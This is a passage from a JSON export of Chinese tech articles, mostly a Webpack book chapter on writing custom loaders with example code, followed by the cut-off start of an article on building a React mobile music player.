class=\"hljs-regexp\"\u003e/\\.scss/\u003c/span\u003e,\n        \u003cspan class=\"hljs-comment\"\u003e// SCSS 文件的处理顺序为先 sass-loader 再 css-loader 再 style-loader\u003c/span\u003e\n        use: [\n          \u003cspan class=\"hljs-string\"\u003e'style-loader'\u003c/span\u003e,\n          {\n            \u003cspan class=\"hljs-attr\"\u003eloader\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'css-loader'\u003c/span\u003e,\n            \u003cspan class=\"hljs-comment\"\u003e// 给 css-loader 传入配置项\u003c/span\u003e\n            options:{\n              \u003cspan class=\"hljs-attr\"\u003eminimize\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e, \n            }\n          },\n          \u003cspan class=\"hljs-string\"\u003e'sass-loader'\u003c/span\u003e],\n      },\n    ]\n  },\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003eLoader 的职责\u003c/h2\u003e\n\u003cp\u003e由上面的例子可以看出：一个 Loader 的职责是单一的，只需要完成一种转换。\n如果一个源文件需要经历多步转换才能正常使用，就通过多个 Loader 去转换。\n在调用多个 Loader 去转换一个文件时，每个 Loader 会链式的顺序执行，\n第一个 Loader 将会拿到需处理的原内容，上一个 Loader 处理后的结果会传给下一个接着处理，最后的 Loader 将处理后的最终结果返回给 Webpack。\u003c/p\u003e\n\u003cp\u003e所以，在你开发一个 Loader 时，请保持其职责的单一性，你只需关心输入和输出。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eLoader 基础\u003c/h2\u003e\n\u003cp\u003e由于 Webpack 是运行在 Node.js 之上的，一个 Loader 其实就是一个 Node.js 模块，这个模块需要导出一个函数。\n这个导出的函数的工作就是获得处理前的原内容，对原内容执行处理后，返回处理后的内容。\u003c/p\u003e\n\u003cp\u003e一个最简单的 Loader 的源码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e// source 为 compiler 传递给 Loader 的一个文件的原内容\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 该函数需要返回处理后的内容，这里简单起见，直接把原内容返回了，相当于该 Loader 没有做任何转换\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e source;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于 Loader 运行在 Node.js 中，你可以调用任何 Node.js 自带的 API，或者安装第三方模块进行调用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e sass = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'node-sass'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e sass(source);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003eLoader 进阶\u003c/h2\u003e\n\u003cp\u003e以上只是个最简单的 Loader，Webpack 还提供一些 API 供 Loader 调用，下面来一一介绍。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e获得 Loader 的 options\u003c/h3\u003e\n\u003cp\u003e在最上面处理 SCSS 文件的 Webpack 配置中，给 css-loader 传了 options 参数，以控制 css-loader。\n如何在自己编写的 Loader 中获取到用户传入的 options 呢？需要这样做：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e loaderUtils = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'loader-utils'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e// 获取到用户给当前 Loader 传入的 options\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e options = loaderUtils.getOptions(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e source;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e返回其它结果\u003c/h3\u003e\n\u003cp\u003e上面的 Loader 都只是返回了原内容转换后的内容，但有些场景下还需要返回除了内容之外的东西。\u003c/p\u003e\n\u003cp\u003e例如以用 babel-loader 转换 ES6 代码为例，它还需要输出转换后的 ES5 代码对应的 Source Map，以方便调试源码。\n为了把 Source Map 也一起随着 ES5 代码返回给 Webpack，可以这样写：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e// 通过 this.callback 告诉 Webpack 返回的结果\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.callback(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, source, sourceMaps);\n  \u003cspan class=\"hljs-comment\"\u003e// 当你使用 this.callback 返回内容时，该 Loader 必须返回 undefined，\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 以让 Webpack 知道该 Loader 返回的结果在 this.callback 中，而不是 return 中 \u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中的 \u003ccode\u003ethis.callback\u003c/code\u003e 是 Webpack 给 Loader 注入的 API，以方便 Loader 和 Webpack 之间通信。\n\u003ccode\u003ethis.callback\u003c/code\u003e 的详细使用方法如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.callback(\n    \u003cspan class=\"hljs-comment\"\u003e// 当无法转换原内容时，给 Webpack 返回一个 Error\u003c/span\u003e\n    err: \u003cspan class=\"hljs-built_in\"\u003eError\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// 原内容转换后的内容\u003c/span\u003e\n    content: string | Buffer,\n    \u003cspan class=\"hljs-comment\"\u003e// 用于把转换后的内容得出原内容的 Source Map，方便调试\u003c/span\u003e\n    sourceMap?: SourceMap,\n    \u003cspan class=\"hljs-comment\"\u003e// 如果本次转换为原内容生成了 AST 语法树，可以把这个 AST 返回，\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 以方便之后需要 AST 的 Loader 复用该 AST，以避免重复生成 AST，提升性能\u003c/span\u003e\n    abstractSyntaxTree?: AST\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003eSource Map 的生成很耗时，通常在开发环境下才会生成 Source Map，其它环境下不用生成，以加速构建。\n为此 Webpack 为 Loader 提供了 \u003ccode\u003ethis.sourceMap\u003c/code\u003e API 去告诉 Loader 当前构建环境下用户是否需要 Source Map。\n如果你编写的 Loader 会生成 Source Map，请考虑到这点。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e同步与异步\u003c/h3\u003e\n\u003cp\u003eLoader 有同步和异步之分，上面介绍的 Loader 都是同步的 Loader，因为它们的转换流程都是同步的，转换完成后再返回结果。\n但在有些场景下转换的步骤只能是异步完成的，例如你需要通过网络请求才能得出结果，如果采用同步的方式网络请求就会阻塞整个构建，导致构建非常缓慢。\u003c/p\u003e\n\u003cp\u003e在转换步骤是异步时，你可以这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 告诉 Webpack 本次转换是异步的，Loader 会在 callback 中回调结果\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e callback = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.async();\n    someAsyncOperation(source, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr, result, sourceMaps, ast\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-comment\"\u003e// 通过 callback 返回异步执行后的结果\u003c/span\u003e\n        callback(err, result, sourceMaps, ast);\n    });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e处理二进制数据\u003c/h3\u003e\n\u003cp\u003e在默认的情况下，Webpack 传给 Loader 的原内容都是 UTF-8 格式编码的字符串。\n但有些场景下 Loader 不是处理文本文件，而是处理二进制文件，例如 file-loader，就需要 Webpack 给 Loader 传入二进制格式的数据。\n为此，你需要这样编写 Loader：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 在 exports.raw === true 时，Webpack 传给 Loader 的 source 是 Buffer 类型的\u003c/span\u003e\n    source \u003cspan class=\"hljs-keyword\"\u003einstanceof\u003c/span\u003e Buffer === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n    \u003cspan class=\"hljs-comment\"\u003e// Loader 返回的类型也可以是 Buffer 类型的\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 在 exports.raw !== true 时，Loader 也可以返回 Buffer 类型的结果\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e source;\n};\n\u003cspan class=\"hljs-comment\"\u003e// 通过 exports.raw 属性告诉 Webpack 该 Loader 是否需要二进制数据 \u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports.raw = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上代码中最关键的代码是最后一行 \u003ccode\u003emodule.exports.raw = true;\u003c/code\u003e，没有该行 Loader 只能拿到字符串。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e缓存加速\u003c/h3\u003e\n\u003cp\u003e在有些情况下，有些转换操作需要大量计算非常耗时，如果每次构建都重新执行重复的转换操作，构建将会变得非常缓慢。\n为此，Webpack 会默认缓存所有 Loader 的处理结果，也就是说在需要被处理的文件或者其依赖的文件没有发生变化时，\n是不会重新调用对应的 Loader 去执行转换操作的。\u003c/p\u003e\n\u003cp\u003e如果你想让 Webpack 不缓存该 Loader 的处理结果，可以这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e// 关闭该 Loader 的缓存功能\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.cacheable(\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e source;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e其它 Loader API\u003c/h2\u003e\n\u003cp\u003e除了以上提到的在 Loader 中能调用的 Webpack API 外，还存在以下常用 API：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.context\u003c/code\u003e：当前处理文件的所在目录，假如当前 Loader 处理的文件是 \u003ccode\u003e/src/main.js\u003c/code\u003e，则 \u003ccode\u003ethis.context\u003c/code\u003e 就等于 \u003ccode\u003e/src\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.resource\u003c/code\u003e：当前处理文件的完整请求路径，包括 querystring，例如 \u003ccode\u003e/src/main.js?name=1\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.resourcePath\u003c/code\u003e：当前处理文件的路径，例如 \u003ccode\u003e/src/main.js\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.resourceQuery\u003c/code\u003e：当前处理文件的 querystring。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.target\u003c/code\u003e：等于 Webpack 配置中的 Target，详情见 \u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/2%E9%85%8D%E7%BD%AE/2-7%E5%85%B6%E5%AE%83%E9%85%8D%E7%BD%AE%E9%A1%B9.html\"\u003e2-7其它配置项-Target\u003c/a\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.loadModule\u003c/code\u003e：但 Loader 在处理一个文件时，如果依赖其它文件的处理结果才能得出当前文件的结果时，\n就可以通过 \u003ccode\u003ethis.loadModule(request: string, callback: function(err, source, sourceMap, module))\u003c/code\u003e 去获得 \u003ccode\u003erequest\u003c/code\u003e 对应文件的处理结果。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.resolve\u003c/code\u003e：像 \u003ccode\u003erequire\u003c/code\u003e 语句一样获得指定文件的完整路径，使用方法为 \u003ccode\u003eresolve(context: string, request: string, callback: function(err, result: string))\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.addDependency\u003c/code\u003e：给当前处理文件添加其依赖的文件，以便再其依赖的文件发生变化时，会重新调用 Loader 处理该文件。使用方法为 \u003ccode\u003eaddDependency(file: string)\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.addContextDependency\u003c/code\u003e：和 \u003ccode\u003eaddDependency\u003c/code\u003e 类似，但 \u003ccode\u003eaddContextDependency\u003c/code\u003e 是把整个目录加入到当前正在处理文件的依赖中。使用方法为 \u003ccode\u003eaddContextDependency(directory: string)\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.clearDependencies\u003c/code\u003e：清除当前正在处理文件的所有依赖，使用方法为 \u003ccode\u003eclearDependencies()\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ethis.emitFile\u003c/code\u003e：输出一个文件，使用方法为 \u003ccode\u003eemitFile(name: string, content: Buffer|string, sourceMap: {...})\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e其它没有提到的 API 可以去 \u003ca target=\"_blank\" href=\"https://webpack.js.org/api/loaders/\"\u003eWebpack 官网\u003c/a\u003e 查看。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e加载本地 Loader\u003c/h2\u003e\n\u003cp\u003e在开发 Loader 的过程中，为了测试编写的 Loader 是否能正常工作，需要把它配置到 Webpack 中后，才可能会调用该 Loader。\n在前面的章节中，使用的 Loader 都是通过 Npm 安装的，要使用 Loader 时会直接使用 Loader 的名称，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003emodule\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003erules\u003c/span\u003e: [\n      {\n        \u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/\\.css/\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003euse\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e'style-loader'\u003c/span\u003e],\n      },\n    ]\n  },\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果还采取以上的方法去使用本地开发的 Loader 将会很麻烦，因为你需要确保编写的 Loader 的源码是在 \u003ccode\u003enode_modules\u003c/code\u003e 目录下。\n为此你需要先把编写的 Loader 发布到 Npm 仓库后再安装到本地项目使用。\u003c/p\u003e\n\u003cp\u003e解决以上问题的便捷方法有两种，分别如下：\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eNpm link\u003c/h4\u003e\n\u003cp\u003eNpm link 专门用于开发和调试本地 Npm 模块，能做到在不发布模块的情况下，把本地的一个正在开发的模块的源码链接到项目的 \u003ccode\u003enode_modules\u003c/code\u003e 目录下，让项目可以直接使用本地的 Npm 模块。\n由于是通过软链接的方式实现的，编辑了本地的 Npm 模块代码，在项目中也能使用到编辑后的代码。\u003c/p\u003e\n\u003cp\u003e完成 Npm link 的步骤如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e确保正在开发的本地 Npm 模块（也就是正在开发的 Loader）的 \u003ccode\u003epackage.json\u003c/code\u003e 已经正确配置好；\u003c/li\u003e\n\u003cli\u003e在本地 Npm 模块根目录下执行 \u003ccode\u003enpm link\u003c/code\u003e，把本地模块注册到全局；\u003c/li\u003e\n\u003cli\u003e在项目根目录下执行 \u003ccode\u003enpm link loader-name\u003c/code\u003e，把第2步注册到全局的本地 Npm 模块链接到项目的 \u003ccode\u003enode_moduels\u003c/code\u003e 下，其中的 \u003ccode\u003eloader-name\u003c/code\u003e 是指在第1步中的 \u003ccode\u003epackage.json\u003c/code\u003e 文件中配置的模块名称。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e链接好 Loader 到项目后你就可以像使用一个真正的 Npm 模块一样使用本地的 Loader 了。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eResolveLoader\u003c/h4\u003e\n\u003cp\u003e在 \u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/2%E9%85%8D%E7%BD%AE/2-7%E5%85%B6%E5%AE%83%E9%85%8D%E7%BD%AE%E9%A1%B9.html\"\u003e2-7其它配置项\u003c/a\u003e 中曾介绍过 ResolveLoader 用于配置 Webpack 如何寻找 Loader。\n默认情况下只会去 \u003ccode\u003enode_modules\u003c/code\u003e 目录下寻找，为了让 Webpack 加载放在本地项目中的 Loader 需要修改 \u003ccode\u003eresolveLoader.modules\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e假如本地的 Loader 在项目目录中的 \u003ccode\u003e./loaders/loader-name\u003c/code\u003e 中，则需要如下配置：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003eresolveLoader\u003c/span\u003e:{\n    \u003cspan class=\"hljs-comment\"\u003e// 去哪些目录下寻找 Loader，有先后顺序之分\u003c/span\u003e\n    modules: [\u003cspan class=\"hljs-string\"\u003e'node_modules'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'./loaders/'\u003c/span\u003e],\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e加上以上配置后， Webpack 会先去 \u003ccode\u003enode_modules\u003c/code\u003e 项目下寻找 Loader，如果找不到，会再去 \u003ccode\u003e./loaders/\u003c/code\u003e 目录下寻找。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实战\u003c/h2\u003e\n\u003cp\u003e上面讲了许多理论，接下来从实际出发，来编写一个解决实际问题的 Loader。\u003c/p\u003e\n\u003cp\u003e该 Loader 名叫 comment-require-loader，作用是把 JavaScript 代码中的注释语法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// @require '../style/index.css'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e转换成\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../style/index.css'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该 Loader 的使用场景是去正确加载针对 \u003ca target=\"_blank\" href=\"http://fis.baidu.com/fis3/docs/user-dev/require.html\"\u003eFis3\u003c/a\u003e 编写的 JavaScript，这些 JavaScript 中存在通过注释的方式加载依赖的 CSS 文件。\u003c/p\u003e\n\u003cp\u003e该 Loader 的使用方法如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003emodule\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003eloaders\u003c/span\u003e: [\n      {\n        \u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/\\.js$/\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eloaders\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e'comment-require-loader'\u003c/span\u003e],\n        \u003cspan class=\"hljs-comment\"\u003e// 针对采用了 fis3 CSS 导入语法的 JavaScript 文件通过 comment-require-loader 去转换 \u003c/span\u003e\n        include: [path.resolve(__dirname, \u003cspan class=\"hljs-string\"\u003e'node_modules/imui'\u003c/span\u003e)]\n      }\n    ]\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该 Loader 的实现非常简单，完整代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ereplace\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 使用正则把 // @require '../style/index.css' 转换成 require('../style/index.css');  \u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e source.replace(\u003cspan class=\"hljs-regexp\"\u003e/(\\/\\/ *@require) +(('|\").+('|\")).*/\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'require($2);'\u003c/span\u003e);\n}\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003econtent\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e replace(content);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e本实例\u003ca target=\"_blank\" href=\"https://github.com/gwuhaolin/comment-require-loader\"\u003e提供项目完整代码\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cfigure\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607259d52144ee4?w=1348\u0026amp;h=845\u0026amp;f=jpeg\u0026amp;s=183464\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/a\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e《深入浅出Webpack》全书在线阅读链接\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/5%E5%8E%9F%E7%90%86/5-3%E7%BC%96%E5%86%99Loader.html\"\u003e阅读原文\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1515151174.0267","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be9900"},"id":"5a4e3af86fb9a01cba425d7d","author":{"$oid":"5a4f5f6218646e1ee8be98f3"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"移动端自制音乐播放器--React","meta":{"likeCount":0},"tag":["React.js","前端"],"comment":[],"shortContent":"因为项目是基于React，所以下面的源码基本都是在播放器组件中抽出来的，不过无论在什么框架下开发，逻辑是一样滴。 先从简单的开始讲起吧，说到播放器几个常用的操作按钮肯定少不了，但是最重要的是那一个可以拖动的播放条。 进度条的大致原理就是获取音频的当前播放时长以及音频总时长的比例…","content":"\u003cp\u003e相信大家都有过开发音乐播放器的需求，我也不例外，最近刚好就做了一个这样的需求，所以就顺便把遇到的问题和踩过的坑，分享一下~\u003c/p\u003e\n\u003cp\u003e因为项目是基于React，所以下面的源码基本都是在播放器组件中抽出来的，不过无论在什么框架下开发，逻辑是一样滴。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e播放器皮肤\u003c/h2\u003e\n\u003cp\u003e先从简单的开始讲起吧，说到播放器几个常用的操作按钮肯定少不了，但是最重要的是那一个可以拖动的播放条。\u003c/p\u003e\n\u003cimg width=\"400px\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c41571ce370f8?w=686\u0026amp;h=216\u0026amp;f=png\u0026amp;s=19517\"\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!--进度条begin--\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-progress\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{(r)\u003c/span\u003e =\u0026gt;\u003c/span\u003e { this.audioProgress = r }}\u0026gt;\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-progress-bar\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{(bar)\u003c/span\u003e =\u0026gt;\u003c/span\u003e { this.progressBar = bar }}\u0026gt;\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-progress-bar-preload\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estyle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{{\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth:\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ebufferedPercent\u003c/span\u003e + '%' }}\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-progress-bar-current\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estyle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{{\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth:\u003c/span\u003e `\u003cspan class=\"hljs-attr\"\u003ecalc\u003c/span\u003e(${\u003cspan 